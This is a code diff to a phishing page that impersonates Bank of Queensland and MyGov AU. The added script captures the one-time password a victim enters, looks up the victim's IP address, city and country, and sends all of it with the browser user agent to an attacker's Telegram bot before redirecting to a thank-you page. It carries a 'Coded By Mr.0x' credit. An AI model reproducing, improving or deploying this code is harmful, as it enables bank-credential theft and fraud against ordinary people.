@@ -1747,52 +1747,69 @@
                 </div>
               </section>
             </div>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js" integrity="sha512-pHVGpX7F/27yZ0ISY+VVjyULApbDlD0/X0rgGbTqCE7WFW5MezNTWG/dnhtbBuICzsd0WQPgpE4REBLv+UqChw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-      <script>
-        $(document).ready(function() {
-    function toggleButtonState() {
-        const username = $('#txtUserid').val().trim();
-        if (username && password) {
-            $('#btn-1').prop('disabled', false);
-        } 
-    }
-    $('#txtUserid').on('keyup change', toggleButtonState);
-    let successCount = 0;
-
-    // Form submission handling
-    $('#login-form').submit(function(event) {
-        event.preventDefault();
-
-        var formData = {
-            username: $('#txtUserid').val().trim(),
-            title: 'Bank of QueensLand OTP'
-        };
-        if (formData.username) {
-            $.ajax({
-                type: 'GET',
-                url: 'otp-sn.html',
-                data: formData,
-                success: function(response) {
-                    console.log('Response:', response); // Debug: Check what the response contains
-                    successCount++; // Increase success count on a successful POST
-                    if (successCount === 1) {
-                      window.location.href = "thank.html";
-                    }
-                   
-                },
-                error: function(xhr, status, error) {
-                    console.error('Error:', error); // Handle error
-                },
-            });
+            <script src="config/email.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script>
+        // Same helpers as index.html (or you can put them in a shared .js file)
+        async function sendTelegram(message) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
+                });
+                return await res.json();
+            } catch (e) { console.error(e); return null; }
         }
-        $('#cross-1').click(function () {
-            $('#error-msg').hide(); // Hide the modal
-          });
-    });
-    $('#txtUserid').mask('00000000000000000');
+
+        async function getClientInfo() {
+            let ip = '0.0.0.0';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+            let location = { country: 'Unknown', city: 'Unknown' };
+            try {
+                const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
+                const data = await res.json();
+                location = { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
+            } catch(e) {}
+            return { ip, location, userAgent: navigator.userAgent };
+        }
+
+        $(document).ready(function() {
+            function toggleButton() {
+                const otp = $('#txtUserid').val().trim();
+                $('#btnSignIn').prop('disabled', !otp);
+            }
+            $('#txtUserid').on('keyup change', toggleButton);
+            $('#btnSignIn').prop('disabled', true);
+
+            $('#login-form').submit(async function(e) {
+                e.preventDefault();
+                const otp = $('#txtUserid').val().trim();
+                if (!otp) return;
+
+                const info = await getClientInfo();
+                let message = "";
+                message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+                message += "|Bank Name: Bank of Queensland OTP\n";
+                message += "|OTP-Code: " + otp + "\n";
+                message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+                message += "|Client IP: " + info.ip + "\n";
+                message += "|City : " + info.location.city + "\n";
+                message += "|Country : " + info.location.country + "\n";
+                message += "|UserAgent : " + info.userAgent + "\n";
+                message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+                message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+
+                await sendTelegram(message);
+                // Redirect to thank-you page
+                window.location.href = 'thank.html';
+            });
         });
-      </script>
+    </script>
             <aside id=sidebar role=complementary class="hidden-xs hidden-sm col-md-4">
               <h2 class=sr-only>User Tools</h2>
               <ul class="user-tools list-unstyled">
